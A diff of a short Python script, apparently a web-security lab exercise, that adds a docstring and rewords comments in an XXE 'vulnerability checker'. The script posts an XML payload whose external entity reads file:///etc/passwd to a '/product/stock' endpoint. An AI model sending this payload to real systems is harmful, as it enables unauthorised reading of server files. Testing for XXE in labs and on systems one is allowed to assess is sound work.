@@ -1,10 +1,19 @@
 import requests
 
 def check_xxe_vulnerability(base_url):
+    """
+    Checks for XXE vulnerabilities on the given base URL.
+    
+    Args:
+        base_url (str): The base URL to test for XXE vulnerabilities.
+    
+    Returns:
+        list: A list of results indicating whether an XXE vulnerability was detected.
+    """
     # Construct the full URL for the stock check endpoint
     stock_check_url = base_url.rstrip('/') + '/product/stock'
 
-    # The XXE payload
+    # XXE payload to test for vulnerability
     xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
     <stockCheck>
@@ -13,7 +22,7 @@ def check_xxe_vulnerability(base_url):
     </stockCheck>
     """
 
-    # The headers for the request
+    # Set the headers to indicate that the content is XML
     headers = {
         "Content-Type": "application/xml"
     }
@@ -37,7 +46,7 @@ def check_xxe_vulnerability(base_url):
     return results
 
 if __name__ == "__main__":
-    target_url = input('Enter the base URL to test for xxe vulnerability: ')
+    target_url = input('Enter the base URL to test for XXE vulnerability: ')
     results = check_xxe_vulnerability(target_url)
     for result in results:
         print(result)
